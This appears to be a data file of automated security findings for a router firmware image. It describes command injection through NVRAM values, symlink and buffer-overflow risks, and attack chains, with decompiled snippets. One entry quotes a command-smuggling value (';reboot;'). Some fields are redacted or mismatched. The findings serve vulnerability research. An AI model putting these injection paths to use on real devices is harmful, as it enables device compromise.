{"name": "cmd_injection-frendly_name-system", "file_path": "sbin/system", "location": "sbin/system:0 (main) 0xcd24", "risk_score": 9.0, "confidence": 8.75, "description": "High-risk command injection vulnerability: The program uses 'sprintf(buffer, \"%s %s\", \"mkdir -p\", nvram_get(\"friendly_name\"))' to construct commands, where the 'friendly_name' value is directly concatenated without any filtering. Trigger condition: An attacker sets malicious NVRAM values (e.g., ';reboot;') through other interfaces (such as Web API), which are triggered when the system executes initialization processes. Security impact: Arbitrary commands can be executed with REDACTED_PASSWORD_PLACEHOLDER privileges, with a high probability of successful exploitation.", "code_snippet": "uVar11 = sym.imp.acosNvramConfig_get(*0xcd64);\nsym.imp.sprintf(iVar24 + -0x1e8, *0xccfc, *0xccf8, uVar11);\nsym.imp.system(iVar24 + -0x1e8);", "link_identifiers": ["friendly_name", "acosNvramConfig_get", "sprintf", "system", "mkdir -p"], "notes": "Associated attack path: Web interface setting friendly_name → NVRAM storage → system() execution"}
{"name": "nvram_pollution-openvpnActive", "file_path": "sbin/system", "location": "sbin/system:0 (acos_service) 0x12800", "risk_score": 6.5, "confidence": 5.5, "description": "NVRAM Pollution Propagation Risk: The critical parameter 'openvpnActive' directly controls service startup (system(\"openvpn-start\")) after being retrieved via acosNvramConfig_get. Trigger condition: An attacker pollutes this parameter value (e.g., setting it to non-zero). Security impact: 1) Unauthorized activation of OpenVPN service 2) Potential exploit chain formation when combined with other vulnerabilities. Boundary check is missing, though direct pollution path remains unconfirmed.", "code_snippet": "iVar1 = sym.imp.acosNvramConfig_get(*0x12a8c);\nif (iVar1 != 0) {\n    sym.imp.system(*0x12ac8); // openvpn-start\n}", "link_identifiers": ["openvpnActive", "acosNvramConfig_get", "system", "openvpn-start"], "notes": "Potential exploitation chain component: requires validation of pollution entry"}
{"name": "symlink_risk-RMT_invite", "file_path": "sbin/system", "location": "etc/init.d/remote.sh:12 (script) 0x0", "risk_score": 8.0, "confidence": 8.0, "description": "Symbolic Link Security Risk: The use of 'ln -s' in /etc/init.d/remote.sh to create CGI script links does not validate the target path. Trigger Condition: An attacker pre-creates a malicious symbolic link. Security Impact: When the web server accesses /tmp/www/cgi-bin/RMT_invite.cgi, it may lead to arbitrary code execution.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["ln", "/tmp/www/cgi-bin/RMT_invite.cgi", "leafp2p_services", "remote.sh"], "notes": "It is necessary to verify the actual call chain in conjunction with leafp2p_services"}
{"name": "attack_chain-hotplug_hardware_to_rce", "file_path": "sbin/hotplug", "location": "HIDDEN: sbin/hotplug → sbin/hotplug2", "risk_score": 9.0, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["hotplug", "hotplug2", "ACTION", "DEVPATH", "SYSTEM_ACTION", "/etc/hotplug2.rules"], "notes": "Associated knowledge base records: 1) sbin/hotplug analysis failed (file unreadable) 2) sbin/hotplug2 command injection vulnerability. Manual verification required: 1) /etc/hotplug2.rules file permissions 2) Whether hotplug events pass input to hotplug2 via environment variables."}
{"name": "command_injection-rc-0x0000efd0", "file_path": "sbin/rc", "location": "rc:0x0000efd0", "risk_score": 9.5, "confidence": 8.0, "description": "High-risk command injection vulnerability: Function fcn.0000ed80 (0x0000efd0) in rc executes commands pointed to by global pointers *0xfd88/*0xfd8c via system(). Trigger condition: When nvram_get(*0xfd80) returns empty or strcmp(*0xfd84) mismatches. Critical flaw: The command string is entirely controlled by NVRAM values without validation, allowing attackers to poison inputs via HTTP interface/NVRAM settings to achieve arbitrary command execution.", "code_snippet": "if ((iVar2 == 0) || (iVar2 = sym.imp.strcmp(iVar2,*0xfd84), iVar2 != 0)) {\n    sym.imp.system(*0xfd88);\n    sym.imp.system(*0xfd8c);\n}", "link_identifiers": ["system", "*0xfd88", "*0xfd8c", "nvram_get", "strcmp", "*0xfd80", "*0xfd84"], "notes": "Complete attack path: HTTP parameters → NVRAM configuration interface → triggered during rc startup"}
{"name": "config_tamper-rc-0x0000ee20", "file_path": "sbin/rc", "location": "rc:0x0000ee20", "risk_score": 8.0, "confidence": 7.5, "description": "File Write Vulnerability: At fcn.0000ed80 (0x0000ee20), a file at path *0xff30 is opened in write mode via fopen, and 23 bytes of content controlled by *0xff08 are written. Trigger condition: nvram_get(*0xfd54) returns a specific value followed by a successful strcmp match. Vulnerability point: The written content is entirely controlled by NVRAM without validation, potentially allowing malicious overwriting of critical configurations.", "code_snippet": "iVar2 = sym.imp.fopen(*0xff30,*0xff34);\nsym.imp.fwrite(*0xff08,1,0x23,iVar2);", "link_identifiers": ["fopen", "fwrite", "*0xff30", "*0xff08", "nvram_get", "*0xfd54"]}
{"name": "nvram_pollution-rc-0x0000ed80", "file_path": "sbin/rc", "location": "rc:0x0000ed80", "risk_score": 8.5, "confidence": 8.5, "description": "NVRAM contamination propagation path: fcn.0000ed80 contains 21 nvram_get calls (e.g., *0xfd54, *0xfd80, etc.), directly affecting: 1) branch condition judgments (strcmp), 2) file write content (*0xff08), 3) command execution parameters (*0xfd88). Critical constraint missing: all NVRAM value usage points lack length checks or content filtering, creating a system-level contamination entry point.", "link_identifiers": ["nvram_get", "*0xfd54", "*0xfd80", "*0xff08", "*0xfd88", "strcmp"]}
{"name": "REDACTED_SENSITIVE_DATA", "file_path": "sbin/rc", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 0.5, "confidence": 4.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["TZ", "getenv", "auStack_424", "REDACTED_SENSITIVE_DATA"]}
{"name": "env-pollution-curl-http-proxy", "file_path": "sbin/curl", "location": "sbin/curl:0x000113f0 sym.operate_do", "risk_score": 8.5, "confidence": 8.25, "description": "HTTP_PROXY environment variable pollution leading to man-in-the-middle attack: 1) The operate_do function reads the HTTP_PROXY environment variable value via curl_getenv 2) Directly configures the proxy through tool_setopt without validation 3) Attackers can force curl traffic through a malicious proxy by polluting environment variables (e.g., via NVRAM/web interface). Trigger conditions: a) Firmware allows remote setting of environment variables b) User executes curl network requests. Actual impact: Sensitive data theft/traffic tampering.", "code_snippet": "iVar9 = sym.curl_getenv(*0x12248);\niVar3 = sym.imp.strdup();\nparam_2[0x45] = iVar3;", "link_identifiers": ["operate_do", "curl_getenv", "tool_setopt", "CURLOPT_PROXY", "HTTP_PROXY"], "notes": "Associated knowledge base ID: curl-o-parameter-path-traversal/curl-T-parameter-arbitrary-read. Need to verify environment variable setting mechanism, NVRAM interface may be the contamination entry point."}
{"name": "exploit-chain-nvram-pollution-leafp2p", "file_path": "etc/init.d/leafp2p.sh", "location": "etc/init.d/leafp2p.sh:5-12", "risk_score": 9.0, "confidence": 7.75, "description": "Confirm the complete NVRAM pollution attack chain: 1) The attacker sets the leafp2p_sys_prefix NVRAM value through an unauthorized interface (e.g., Web CGI) → 2) The system executes /etc/init.d/leafp2p.sh during startup or service restart → 3) The script reads the polluted value via `SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)` → 4) The polluted value is directly injected into the PATH environment variable and CHECK_LEAFNETS execution path → 5) When `${CHECK_LEAFNETS} &` is executed, the attacker-controlled malicious script runs. Trigger conditions: a) NVRAM write permissions b) Deployment of a malicious checkleafnets.sh in the polluted path c) Service startup event.", "code_snippet": "SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)\nPATH=${SYS_PREFIX}/bin:...\nCHECK_LEAFNETS=${SYS_PREFIX}/bin/checkleafnets.sh\nstart() {\n    ${CHECK_LEAFNETS} &", "link_identifiers": ["leafp2p_sys_prefix", "nvram get", "SYS_PREFIX", "PATH", "CHECK_LEAFNETS", "checkleafnets.sh", "start()"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "cmd_injection-env_nvram_system-fcn1728c", "file_path": "sbin/system", "location": "fcn.0001728c (0x16024, 0x15d5c)", "risk_score": 9.0, "confidence": 8.0, "description": "High-risk command injection chain: The attacker triggers NVRAM pollution (fcn.0001728c+0x16024) by contaminating environment variables (e.g., HTTP_USER_AGENT). The contaminated NVRAM value is directly concatenated into the sprintf format string at fcn.0001728c+0x15d5c without filtering, ultimately executed via system. Trigger conditions: 1) During network configuration operations 2) Contaminated data contains command separators. Boundary check: No input filtering mechanism, only simple whitespace trimming. Exploitability: High (arbitrary command injection possible).", "code_snippet": "iVar7 = sym.imp.getenv(*0x16e84);\nsym.imp.acosNvramConfig_set(*0x16f00,iVar7);\nuVar13 = sym.imp.acosNvramConfig_get(...);\nsym.imp.sprintf(iVar18,*0x15e9c,pcVar10,uVar13);\nsym.imp.system(iVar18);", "link_identifiers": ["getenv", "acosNvramConfig_set", "acosNvramConfig_get", "sprintf", "system", "HTTP_USER_AGENT"], "notes": "Full attack path: Environment variable pollution → NVRAM storage → Command concatenation → System command execution. It is recommended to verify environment variable setting points in the web interface."}
{"name": "buffer_overflow-env_path_concatenation-fcn17360", "file_path": "sbin/system", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 8.0, "confidence": 7.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "strcat(puVar8,iVar9);\niVar1 = sym.imp.fopen(puVar8,*0x17968);", "link_identifiers": ["strcat", "acStack_254", "iVar9", "fopen", "getenv"], "notes": "Verification required: 1) Initial content of puVar8 2) Maximum overflowable length 3) Status of stack protection mechanism. Potential combined vulnerability with NVRAM contamination chain."}
{"name": "cmd_injection-leafp2p_service-fcn1728c", "file_path": "sbin/system", "location": "fcn.0001728c", "risk_score": 7.5, "confidence": 8.0, "description": "command_execution  \n\nRisk in leafp2p.sh service control: The system file directly executes `sh /etc/init.d/leafp2p.sh start/stop` via the system function. Trigger condition: Network configuration changes (e.g., PPPoE connection). Security impact: 1) If command construction parameters (e.g., pcVar10) are tainted, malicious commands can be injected; 2) Combined with NVRAM taint chain, it enables secondary attacks. Boundary check: No input filtering detected.", "code_snippet": "sym.imp.sprintf(iVar18,*0x16eec,pcVar10,uVar13);\nsym.imp.system(iVar18);", "link_identifiers": ["system", "sprintf", "sh /etc/init.d/leafp2p.sh start", "leafp2p_run"], "notes": "Associated file: /etc/init.d/leafp2p.sh (requires analysis for potential command injection risks). Potential contamination sources may originate from environment variables or NVRAM."}
{"name": "cmd_injection-nvram_loop_exec-fcn1728c", "file_path": "sbin/system", "location": "fcn.0001728c+0x16ac0", "risk_score": 8.0, "confidence": 6.75, "description": "NVRAM Loop Command Execution Risk: At fcn.0001728c+0x16ac0, NVRAM values are split by getTokens and then used to loop-execute system commands. Trigger Condition: NVRAM values contain command separators such as semicolons. Boundary Check: No filtering for dangerous characters. Exploitability: Single contamination triggers execution of multiple commands, amplifying attack impact.", "code_snippet": "uVar13 = sym.imp.acosNvramConfig_get(...);\niVar18 = sym.imp.getTokens(uVar13,...);\ndo {\n  sym.imp.system(iVar3);\n} while(...);", "link_identifiers": ["acosNvramConfig_get", "getTokens", "system"], "notes": "nvram_get"}
{"name": "unverified_items-config_check", "file_path": "sbin/system", "location": "N/A", "risk_score": 0.0, "confidence": 4.75, "description": "Unverified items:  \n1) Configuration item 0x3954 has no references in the system file.  \n2) The path ${SYS_PREFIX}/bin/checkleafnets.sh is not referenced.  \n3) No direct evidence found for operations involving the SYS_PREFIX environment variable.  \nEvidence gap: Verification of cross-directory file existence exceeds tool permissions.", "link_identifiers": ["0x3954", "checkleafnets.sh", "SYS_PREFIX", "getenv"], "notes": "Follow-up suggestions: 1) Analyze the www directory to verify the NVRAM settings for the web interface 2) Check the existence of /bin/checkleafnets.sh and its caller 3) Review the environment variable initialization in the firmware startup scripts"}
{"name": "configuration_load-readydropd-external_usb_admin_chain", "file_path": "www/cgi-bin/readydropd.conf", "location": "www/cgi-bin/readydropd.conf", "risk_score": 8.0, "confidence": 8.0, "description": "configuration_load specifies an external USB mount path as the home_dir (/tmp/mnt/usb0/part1). When a malicious USB device is connected, attackers can influence service behavior through file implantation or path traversal. Combined with the high privileges of httpd_user=REDACTED_PASSWORD_PLACEHOLDER, this could form an attack chain of 'external media input → path traversal → privilege escalation'. Trigger condition: inserting a malicious USB device and inducing the service to access a specific path.", "code_snippet": "home_dir = /tmp/mnt/usb0/part1\nhttpd_user = REDACTED_PASSWORD_PLACEHOLDER", "link_identifiers": ["home_dir", "/tmp/mnt/usb0/part1", "httpd_user", "REDACTED_PASSWORD_PLACEHOLDER"], "notes": "Verify the handling logic of the home_dir by the readydropd main program (recommend analyzing the www/cgi-bin/readydropd binary file)"}
{"name": "configuration_load-readydropd-httpd_admin_privilege", "file_path": "www/cgi-bin/readydropd.conf", "location": "www/cgi-bin/readydropd.conf", "risk_score": 7.5, "confidence": 7.5, "description": "The httpd_user is configured as a high-privilege REDACTED_PASSWORD_PLACEHOLDER account without defined permission boundaries. If a vulnerability (e.g., buffer overflow) exists in the service, attackers may directly obtain REDACTED_PASSWORD_PLACEHOLDER privileges. Trigger condition: Sending malicious data through network interfaces or IPC to exploit the vulnerability.", "code_snippet": "httpd_user = REDACTED_PASSWORD_PLACEHOLDER\nhttpd_group = REDACTED_PASSWORD_PLACEHOLDER", "link_identifiers": ["httpd_user", "REDACTED_PASSWORD_PLACEHOLDER", "httpd_group"], "notes": "It is recommended to verify the actual process permissions (validate through system startup scripts)"}
{"name": "configuration_load-readydropd-log_level_info_leak", "file_path": "www/cgi-bin/readydropd.conf", "location": "www/cgi-bin/readydropd.conf", "risk_score": 5.0, "confidence": 6.0, "description": "The log level is set to the highest (level=2), which may record sensitive data (such as user credentials) in debug mode. If the log file permissions are improperly configured (e.g., globally readable), it can lead to information leakage. Trigger condition: An attacker accesses the log storage path.", "code_snippet": "log_level = 2", "link_identifiers": ["log_level"], "notes": "Verify the log storage path (recommended to check the log_path configuration item)"}
{"name": "potential_chain-http_to_popen-QUERY_STRING_param1", "file_path": "www/cgi-bin/genie.cgi", "location": "HIDDEN：www/cgi-bin/genie.cgi (QUERY_GETHIDDEN) → HIDDEN (HIDDEN)", "risk_score": 8.0, "confidence": 3.5, "description": "Attack chain constructed based on association analysis: 1) Input source: QUERY_STRING parameter in HTTP requests (refer to genie.cgi discovery) 2) Propagation path: transmitted via param_1 variable 3) Hazardous operations: popen command execution + nvram_get configuration retrieval + strncpy boundary absence. Trigger condition: attacker manipulates QUERY_STRING to inject commands or oversized data. Actual impact: command injection leading to RCE or buffer overflow. Limitation: complete control flow unverified due to missing symbols, requiring dynamic testing for confirmation.", "link_identifiers": ["QUERY_STRING", "param_1", "popen", "nvram_get", "strncpy", "genie.cgi"], "notes": "Correlation basis: 1) genie.cgi discovery proves QUERY_STRING is controllable and correlates with param_1. 2) New analysis confirms param_1 flows into dangerous functions. To be verified: Specific data flow from param_1 to popen/nvram_get. Additional recommendation: Prioritize dynamic tracing of param_1's transmission path in genie.cgi."}
